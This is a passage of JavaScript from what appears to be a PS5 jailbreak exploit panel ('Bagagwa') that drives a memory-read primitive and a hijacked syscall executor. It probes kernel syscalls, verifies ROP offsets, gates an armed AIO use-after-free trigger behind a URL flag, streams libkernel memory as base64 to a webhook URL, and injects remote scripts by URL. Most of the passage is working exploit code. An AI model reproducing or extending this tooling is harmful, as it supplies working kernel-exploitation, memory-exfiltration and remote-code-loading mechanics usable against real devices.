                return " heapMB=" + (performance.memory.usedJSHeapSize / 1048576).toFixed(1)
                    + "/" + (performance.memory.jsHeapSizeLimit / 1048576).toFixed(0);
        } catch (e) { }
        return "";
    }

    function dumpAbort(quietFlag) {
        if (!DUMP.run) return false;
        DUMP.run = false;
        if (!quietFlag) out("DUMP", "STOP requested by operator", "warn");
        return true;
    }

    function dumpStart() {
        var url = "", len = 0x4000, chunk = 0x800, which = "lk", base = lkBase();
        try {
            url = String(document.getElementById("bwp-durl").value || "").trim();
            len = numOr(document.getElementById("bwp-dlen").value, 0x4000);
            chunk = numOr(document.getElementById("bwp-dchunk").value, 0x800);
            which = String(document.getElementById("bwp-dbase").value || "lk").trim().toLowerCase();
        } catch (e) { }
        if (!url) { out("DUMP", "no POST target: open tools and paste a webhook URL first", "err"); return; }
        if (DUMP.run) { out("DUMP", "already streaming -- press stop first", "warn"); return; }
        if (which.slice(0, 2) === "wk") base = wkBase();
        if (base === 0n) { out("DUMP", "no " + which + " base in the executor state", "err"); return; }
        if (!window.read_buffer) { out("DUMP", "window.read_buffer missing -- no memory primitive", "err"); return; }

        var total = len, done = 0;
        DUMP = { run: true, sent: 0, bytes: 0, failed: 0, chunks: 0, t0: Date.now() };
        var session = FW + "-" + Date.now();
        out("DUMP", "streaming " + (which === "lk" ? "libkernel" : which) + " from " + hex(base)
            + " : " + total + " bytes in " + chunk + "-byte chunks -> " + url.slice(0, 70)
            + heapNote(), "sec");

        postText(url, "BAGA-BEGIN " + session + " fw=" + FW + " base=" + hex(base)
            + " total=" + total + " chunk=" + chunk + "\n", function () { });

        (function step() {
            if (!DUMP.run) return;
            if (done >= total) return finish();
            var n = Math.min(chunk, total - done), b;
            try {
                b = window.read_buffer(base + B(done), n);
            } catch (e) {
                DUMP.failed++;
                out("DUMP", "read threw at +" + hex(done) + ": " + String((e && e.message) || e).slice(0, 60), "err");
                done += n;
                return setTimeout(step, 0);
            }
            var payload = "BAGA " + hex(done) + " " + b.length + " " + b64(b) + "\n";
            b = null;                                   /* drop the chunk: nothing accumulates */
            DUMP.chunks++;
            postText(url, payload, function (ok, why) {
                if (ok) { DUMP.sent++; DUMP.bytes += n; }
                else { DUMP.failed++; }
                payload = null;
                done += n;
                if (DUMP.chunks % 16 === 0)
                    out("DUMP", done + "/" + total + " bytes, sent=" + DUMP.sent
                        + " failed=" + DUMP.failed + heapNote(), "dim");
                setTimeout(step, 0);
            });
        })();

        function finish() {
            DUMP.run = false;
            var ms = Date.now() - DUMP.t0;
            postText(url, "BAGA-END " + session + " chunks=" + DUMP.chunks + " bytes=" + DUMP.bytes
                + " failed=" + DUMP.failed + "\n", function () { });
            out("DUMP-VERDICT", "streamed " + DUMP.bytes + " bytes in " + DUMP.chunks + " chunks, "
                + DUMP.sent + " delivered, " + DUMP.failed + " failed, in " + ms + " ms. "
                + "Nothing was retained in memory. Check the collector for BAGA-BEGIN/BAGA/BAGA-END.",
                DUMP.sent > 0 ? "ok" : "err");
            nres(DUMP.sent + " chunks sent (" + DUMP.bytes + "B)", "dump");
        }
    }

    /* A convenience tile: if a URL is filled in, stream; if not, say exactly what to
     * do. Kept as a tile because the operator's flow is "tap things", and self-
     * documenting because the tools drawer is collapsed by default. */
    function pDump() {
        var url = "";
        try { url = String(document.getElementById("bwp-durl").value || "").trim(); } catch (e) { }
        try { var t = document.getElementById("bwp-tools"); if (t) t.className = "bwp-tools on"; } catch (e) { }
        if (!url) {
            out("DUMP", "Tools opened. Paste a POST target (e.g. https://webhook.site/<uuid>), pick bytes/chunk, "
                + "then tap Stream dump. Text format: BAGA-BEGIN / BAGA <off> <len> <base64> / BAGA-END.", "dim");
            return { ok: true, summary: "waiting for a POST target (tools opened)" };
        }
        dumpStart();
        return { ok: true, summary: "streaming to " + url.slice(0, 40) };
    }

    /* ------------------------------------------------------- REMOTE JS LOADER
     * The Y2JB remotejsloader pattern: the page holds no payload, it fetches one by
     * URL at run time. That is the right shape for this panel too -- it is how a
     * payload gets served from a host that is NOT this origin, without bundling it.
     *
     * SCOPE, stated plainly: this injects a <script> into THIS page. It is the same
     * trust level as the page itself, so it can do anything the panel can. It is a
     * research convenience, not a security boundary, and the operator supplies the
     * URL. */
    function loadRemoteJS(url) {
        if (!url) { out("LOAD", "no script URL given", "err"); return { ok: false }; }
        out("LOAD", "injecting <script src=\"" + url.slice(0, 90) + "\">", "dim");
        try {
            var s = document.createElement("script");
            s.src = url;
            s.onload = function () {
                out("LOAD", "LOADED " + url.slice(0, 80)
                    + " -- exported globals: " + remoteGlobals(), "ok");
                nres("remote script loaded", "load");
            };
            s.onerror = function () {
                out("LOAD", "FAILED (404 / CSP / offline): " + url.slice(0, 80), "err");
                nres("remote script failed", "load");
            };
            document.head.appendChild(s);
        } catch (e) {
            out("LOAD", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
            return { ok: false };
        }
        return { ok: true, summary: "injected " + url.slice(0, 40) };
    }
    /* What did it actually add? A failure that says nothing is useless on a console. */
    var GLOBALS0 = null;
    function snapshotGlobals() {
        var t = {}, k;
        try { for (k in window) t[k] = 1; } catch (e) { }
        return t;
    }
    function remoteGlobals() {
        try {
            if (!GLOBALS0) return "(baseline not taken)";
            var now = snapshotGlobals(), add = [], k;
            for (k in now) if (!GLOBALS0[k]) add.push(k);
            return add.length ? add.slice(0, 12).join(",") : "(none new)";
        } catch (e) { return "(?)"; }
    }
    GLOBALS0 = snapshotGlobals();

    /* ============================================================ the menu */

    var PAYLOADS = [
        {
            id: "calibrate", label: "Calibrate LK row", run: pCalibrate,
            desc: "Read-only. Measures the REAL slot_expect from the parked worker stack (the "
                + "extrapolated 13.60 value was wrong) and patches the row live. Run this first.",
        },
        {
            id: "convention", label: "Syscall convention", run: pConvention,
            desc: "Read-only. Determines how this kernel reports errors, from close() on a bad "
                + "fd plus a live canary. Calls only native stub numbers -- never unproven "
                + "ones (an out-of-range call WEDGED real 13.60 hardware). Run before trusting "
                + "any errno verdict.",
        },
        {
            id: "identity", label: "Identity", run: pIdentity,
            desc: "getpid / getuid / getgid family. The positive control: if this answers, the "
                + "executor, the libkernel base and the worker hijack are all good.",
        },
        {
            id: "resources", label: "Descriptors", run: pResources,
            desc: "kqueue and pipe2 -- the two fd-returning calls the reclaim paths need. "
                + "Both are closed again.",
        },
        {
            id: "kbugs", label: "P2JB/poops calls", run: pKbugs,
            desc: "Read-only. Calls the REAL syscalls the patched 12.00-12.70 kernel chains "
                + "drive: socket(AF_INET6), setsockopt(IPV6_RTHDR) tag, getsockopt read-back "
                + "and the cross-descriptor bug shape, getrlimit. Every fd closes again; "
                + "nothing writes kernel memory.",
        },
        {
            id: "aio", label: "AIO reach", run: pAio,
            desc: "aio_init and aio_multi_wait with ALL-ZERO arguments. num=0 cannot link a "
                + "waiter list, so this cannot arm the UAF. THE decisive test.",
        },
        {
            id: "live", label: "AIO live request", run: pLive,
            desc: "Creates a LIVE pending AIO request (socketpair + pending MULTI_READ) and "
                + "waits on it with num=1. num=1 can never reproduce the UAF (that needs "
                + "num>=2 in ONE call). Measures what the armed call will see.",
        },
        {
            id: "abimap", label: "ABI map", run: pAbiMap,
            desc: "Read-only and arming-safe by construction. Finds which argument is the ids "
                + "array and which is num. num never reaches 2 with a valid array.",
        },
        {
            id: "osem", label: "osem", run: pOsem,
            desc: "osem_create / open / close / delete. The 32-bit refcount at +0x54 is the "
                + "chain's intended target.",
        },
        ARMED_OK ? {
            id: "arm", label: "UAF arm (UNSAFE)", run: pArm,
            desc: "DELIBERATELY UNSAFE -- the real aio_multi_wait num=2. A failed run is a "
                + "POWER CYCLE, not a reload. Detection is JS-readable: sentinel decs, WAKE "
                + "name strings, witness blocks. Only rendered behind ?arm=1.",
        } : null,
        {
            id: "offsets", label: "Verify offsets (memory read)", run: pOffsets,
            desc: "Read-only. Resolves every libkernel RVA this tree uses to a LIVE address and "
                + "reads the bytes that are really there. Catches a wrong libkernel base -- the "
                + "failure mode where every syscall still answers while every ROP address is off.",
        },
        {
            id: "peek", label: "Peek libkernel", run: pPeek,
            desc: "Read-only. Dumps a SMALL fixed window of libkernel text (notify entry, parked "
                + "resume slot, syscall stub) so the offsets above can be eyeballed as real bytes.",
        },
        {
            id: "dump", label: "Libkernel dump (stream)", run: pDump,
            desc: "Read-only. Streams a bounded slice of libkernel to a POST target (webhook / LAN "
                + "collector) in small chunks, one chunk in memory at a time and dropped after "
                + "each POST -- so a large dump costs the same heap as a tiny one.",
        },
        {
            id: "exec", label: "Executor state", run: pExecutor,
            desc: "Read-only. Dumps kbase, the resolved hijack slot and the P2JB_LK row, so a "
                + "failure above can be attributed.",
        },
    ];

    /* The armed tile is only ever appended behind ?arm=1 (the index.html checkbox), so
     * the null entry needs filtering out of the plain read-only suite. */
    var PAYLOADS = PAYLOADS.filter(function (p) { return p; });

    var STATE = {};
    var TILE = {};

    function renderTile(id) {
        var t = TILE[id];
        if (!t) return;
        var s = STATE[id] || "idle";
        t.className = "bwp-tile" + (s === "run" ? " busy" : s === "ok" ? " ok" : s === "bad" ? " bad" : "");
        t.querySelector(".bwp-state").textContent =
            s === "run" ? "running..." : s === "ok" ? "ok" : s === "bad" ? "failed" : "idle";
    }

    /* Per-tile outcome record. The operator asked for DETAILED results: every tile now
     * reports elapsed milliseconds and a single-line outcome that is safe to paste into
     * a bug report, and RUN ALL prints the whole table at the end instead of just a
     * count. RESULTS[] is bounded by the tile count, so this costs nothing. */
    var RESULTS = [];

    function runPayload(p) {
        if (STATE[p.id] === "run") return;
        STATE[p.id] = "run";
        renderTile(p.id);
        paint("--- " + p.label + " ---", "sec");
        var res, t0 = Date.now();
        try { res = p.run(); } catch (e) {
            out(p.id + "-THREW", String((e && e.message) || e).slice(0, 140), "err");
            res = { ok: false };
        }
        var ms = Date.now() - t0;
        STATE[p.id] = res && res.ok ? "ok" : "bad";
        renderTile(p.id);
        RESULTS.push({ id: p.id, label: p.label, ok: !!(res && res.ok), ms: ms,
            summary: (res && res.summary) || "" });
        if (res && res.summary) paint("    " + p.label + ": " + res.summary, res.ok ? "dim" : "warn");
        out(p.id + "-DETAIL", (res && res.ok ? "PASS" : "FAIL") + " in " + ms + " ms"
            + (res && res.summary ? " \u2014 " + res.summary : ""), res && res.ok ? "dim" : "warn");
    }

    for (var i = 0; i < PAYLOADS.length; i++) {
        (function (p) {
            var t = document.createElement("button");
            t.className = "bwp-tile";
            t.innerHTML = '<span class="bwp-name"></span><span class="bwp-desc"></span><span class="bwp-state">idle</span>';
            t.querySelector(".bwp-name").textContent = p.label;
            t.querySelector(".bwp-desc").textContent = p.desc;
            t.onclick = function () { runPayload(p); };
            elGrid.appendChild(t);
            TILE[p.id] = t;
        })(PAYLOADS[i]);
    }

    /* Payloads run one at a time with a repaint between them, so the tiles animate instead
     * of the whole suite appearing to freeze on a single tick. */
    function runAll() {
        paint("=== RUN ALL ===  fw=" + FW + (ARMED_OK ? "  (ARM MODE: the UAF tile will fire)" : "  (userland only, no kernel writes)"), "sec");
        RESULTS.length = 0;
        var q = PAYLOADS.slice();
        (function next() {
            if (!q.length) {
                var ok = PAYLOADS.filter(function (p) { return STATE[p.id] === "ok"; }).length;
                /* The DETAILED table. A count alone told the operator nothing about
                 * WHICH measurement failed; this prints every tile with its millisecond
                 * cost and its own one-line outcome, in run order. */
                paint("--- detailed results (" + RESULTS.length + " tiles) ---", "sec");
                for (var ri = 0; ri < RESULTS.length; ri++) {
                    var r = RESULTS[ri];
                    paint("    " + (r.ok ? "[ ok ]" : "[FAIL]")
                        + " " + (r.ms + "ms").padStart(7)
                        + "  " + r.label + (r.summary ? " \u2014 " + r.summary : ""),
                        r.ok ? "ok" : "err");
                }
                out("RUNALL-VERDICT", ok + "/" + PAYLOADS.length + " payloads reported ok. "
                    + (ARMED_OK
                        ? "ARM MODE ran: read the ARM-VERDICT row above -- it is the one that says whether the UAF is real."
                        : "Read the AIO reach row above: it is the one that decides Bagagwa's fate."), "sec");
                nres(ok + "/" + PAYLOADS.length + " tiles ok" + (ARMED_OK ? " [ARM RAN -- see log]" : ""), "done");
                paint("", null);
                return;
            }
            runPayload(q.shift());
            setTimeout(next, 60);
        })();
    }

    function download() {
        try {
            var saved = null;
            try { saved = localStorage.getItem(LOGKEY); } catch (e) { }
            var body = (saved && saved.length > LOG.join("\n").length) ? saved : (LOG.join("\n") + "\n");
            var blob = new Blob([body], { type: "text/plain" });
            var a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "bagagwa_" + FW + "_" + Date.now() + ".txt";
            document.body.appendChild(a);
            a.click();
            setTimeout(function () { try { a.remove(); } catch (e) { } }, 0);
            paint("log downloaded (" + LOG.length + " lines)", "dim");
        } catch (e) {
            paint("download failed: " + String((e && e.message) || e).slice(0, 90), "err");
        }
    }

    document.getElementById("bwp-all").onclick = runAll;

    /* FULLSCREEN, with the undo the operator asked for. Two independent exits: the
     * floating button (a body child at max z-index, so the log can never cover it)
     * and the Esc key. The inline button is a third. */
    var fsBtn = document.getElementById("bwp-fs");
    function setFullscreen(on) {
        if (on) elOut.classList.add("fs"); else elOut.classList.remove("fs");
        fsBtn.textContent = on ? "exit fullscreen" : "fullscreen";
        fsx.style.display = on ? "block" : "none";
        if (on) elOut.scrollTop = elOut.scrollHeight;
    }
    fsBtn.onclick = function () { setFullscreen(!elOut.classList.contains("fs")); };
    fsx.onclick = function () { setFullscreen(false); };
    /* typeof-guarded: the headless harnesses stub document without addEventListener,
     * and a missing Esc handler must never be the thing that fails a test run. */
    if (typeof document.addEventListener === "function") {
        document.addEventListener("keydown", function (e) {
            /* Esc exits fullscreen; it must not swallow anything else. */
            if (e && (e.key === "Escape" || e.keyCode === 27) && elOut.classList.contains("fs")) {
                setFullscreen(false);
            }
        }, false);
    }

    /* ---- tools drawer: dumper + remote loader + the reference note. Collapsed by
     * default so the panel still reads simply; the dump tile opens it on demand. */
    var toolsBtn = document.getElementById("bwp-toolsbtn");
    var toolsEl = document.getElementById("bwp-tools");
    if (toolsBtn && toolsEl) {
        toolsBtn.onclick = function () {
            var on = toolsEl.className.indexOf("on") < 0;
            toolsEl.className = "bwp-tools" + (on ? " on" : "");
            this.textContent = on ? "hide tools" : "tools";
        };
    }
    try {
        document.getElementById("bwp-note").textContent =
            "Read-only help: dump streams libkernel as BAGA-BEGIN / BAGA <off> <len> <base64> / BAGA-END "
            + "posts you can reassemble offline; nothing is retained in memory. The loader injects a "
            + "remote <script> (Y2JB remotejsloader pattern) at the same trust level as this page. "
            + "Reference payload servers worth having on a LAN host: ps5-payload-dev/websrv (HTTP+webdav, "
            + "port 8080), n0llptr/remote_lua_loader (lua payloads, incl. ftp_server.lua on port 1337).";
    } catch (e) { }

    document.getElementById("bwp-dstart").onclick = function () { dumpStart(); };
    document.getElementById("bwp-dstop").onclick = function () {
        if (!dumpAbort()) out("DUMP", "nothing to stop", "dim");
    };
    document.getElementById("bwp-jload").onclick = function () {
        var u = "";
        try { u = String(document.getElementById("bwp-jurl").value || "").trim(); } catch (e) { }
        paint("--- remote js loader ---", "sec");
        loadRemoteJS(u);
    };

    /* PROVEN buttons: each fires ONE already-proven capability and both paints the
     * evidence and pushes the measured result into the PS5's own notification system. */
    var PROVMETA = [
        ["notify", "kernel toast via syscall 0x2CA -- if you read it on the PS5 home screen, native notify is PROVEN"],
        ["pid", "getpid through the executor -- the kernel answers with OUR pid; syscall round-trip PROVEN"],
        ["fd", "kqueue + close -- a real descriptor allocated and freed; fd syscalls PROVEN"],
        ["osem", "osem_create + delete -- a real kernel object in the 128 zone (the Bagagwa reclaim target)"],
        ["aio", "aio_multi_wait(all-zero) measures 0x16 EINVAL -- the syscall EXISTS on this firmware; the Bagagwa gate"],
    ];
    for (var pv = 0; pv < PROVMETA.length; pv++) {
        (function (k, why) {
            var b = document.getElementById("bwp-pv-" + k);
            if (!b) return;
            b.title = why;
            b.onclick = function () {
                paint("--- PROVEN: " + k + " ---", "sec");
                try { PROVEN[k](); } catch (e) {
                    out("PROOF-" + k, "THREW " + String((e && e.message) || e).slice(0, 110), "err");
                }
            };
        })(PROVMETA[pv][0], PROVMETA[pv][1]);
    }
    document.getElementById("bwp-clear").onclick = function () {
        elOut.innerHTML = ""; LOG.length = 0; elCount.textContent = "0 lines";
    };
    var clearSaved = document.getElementById("bwp-clearsaved");
    if (clearSaved) clearSaved.onclick = persistClear;
    document.getElementById("bwp-dl").onclick = download;
    document.getElementById("bwp-hide").onclick = function () {
        root.style.display = "none";
        mini.style.display = "block";
    };
    mini.onclick = function () {
        root.style.display = "flex";
        mini.style.display = "none";
    };

    /* ============================================================== start */

    chip(elUl, "ok", "userland OK");
    var lm = null;
    try { lm = window.P2JB_LK && window.P2JB_LK[FW]; } catch (e) { }
    chip(elVerdict, lm ? "" : "bad", lm ? "LK row present" : "no LK row for " + FW);
    paint("Bagagwa panel up on " + FW + ". Userland succeeded; nothing below writes kernel memory.", "sec");
    paint("Syscall convention is MEASURED first: on a raw syscall;ret wrapper a patched "
        + "aio_multi_wait returns 0x4e, which reads as a small positive value. Never trust an "
        + "ENOSYS verdict before T0 has run.", "dim");
    paint("", null);

    /* Restore the previous run's tail, if there was one -- this is how a crashed run is
     * read on the next boot. The clear-saved-log button only appears when there is
     * something to clear. */
    if (persisted) {
        var tail = persisted.slice(-4000).split("\n").filter(function (l) { return l.length; });
        paint("--- saved log from a previous run (" + tail.length + " lines shown) ---", "warn");
        for (var pi = 0; pi < tail.length; pi++) paint("    " + tail[pi], "dim");
        paint("--- end saved log; new lines resume below ---", "warn");
        paint("", null);
        var csb = document.getElementById("bwp-clearsaved");
        if (csb) csb.style.display = "";
    }

    notify("bagagwa panel up on " + FW);

    /* AUTO-RUN vs WAIT. ?scauto=1 (forwarded from index.html when the operator's
     * "auto-run" checkbox is ticked) starts RUN ALL as soon as userland succeeds.
     * Without it the panel comes up IDLE: userland is done, nothing runs, and the
     * operator taps RUN ALL (or a single tile) when ready. The armed tile rides the
     * same flag set: with ?arm=1 but no ?scauto=1, RUN ALL is always a TAP away --
     * an explicit second action even for the unsafe suite. */
    var AUTORUN = false;
    try { AUTORUN = /(^|[?&])scauto=1(&|$)/.test((window.location && window.location.search) || ""); } catch (e) { }
    if (AUTORUN) {
        try { runAll(); } catch (e) {
            out("PANEL-FAIL", String((e && e.message) || e).slice(0, 140), "err");
        }
    } else {
        paint("Auto-run is OFF (?scauto=1 not set): userland is up, tiles are IDLE. Tap RUN ALL when ready.", "dim");
    }

    /* --------------------------------------------------------------------
     * WHAT IS DELIBERATELY NOT A TILE
     *
     * aio_multi_wait(ids, num>=2, states, mode=0, timeout) is the UAF. Nothing in this
     * file triggers it, for two reasons that are both load-bearing:
     *
     * 1. THE ABI IS NOT SETTLED, AND IT FAILS SILENTLY. Three implementations disagree.
     *    slopkit_ref and PSAITO both put ids first (ids, num, timeout, mode); Bagagwa_chain
     *    puts an instanceId first (instanceId, ids, num, mode). Call it the wrong way and
     *    the mode lands in the wrong register, num is not what you think, the shared-node
     *    link never happens, the array is never freed -- and the call still RETURNS
 *    CLEANLY. A null result would read as "the kernel is patched" when the truth is
 *    "we called it wrong". The ABI map tile above settles the (ids, num) ORDER from
 *    measurement -- and note that is still not the whole call: it cannot pin `mode` or
 *    `timeout`, and it never passes a real request id, so it does not prove the
 *    shared-node path works either. An armed call needs all of that.
     *
     * 2. THERE IS NO DISARM. On p2jb the equivalent mistake had a recovery path. Here the
     *    cleanup at 0x805c0da1 unlinks by node->owner and only detaches from the LAST
     *    request, so requests 0..N-2 keep req->waiters pointing into the freed array --
     *    into objects this process does not own. There is no null_rthdr() equivalent, and
     *    the free at 0x805c0f93 happens in the cleanup path regardless. Once armed, a
     *    failed run is a POWER CYCLE, not a reload. That is what "DO NOT SUMMON BAGAGWA"
     *    means, and it is why the armed call has to be a separate, deliberate act rather
     *    than a tile sitting next to the safe ones.
     * -------------------------------------------------------------------- */
})();
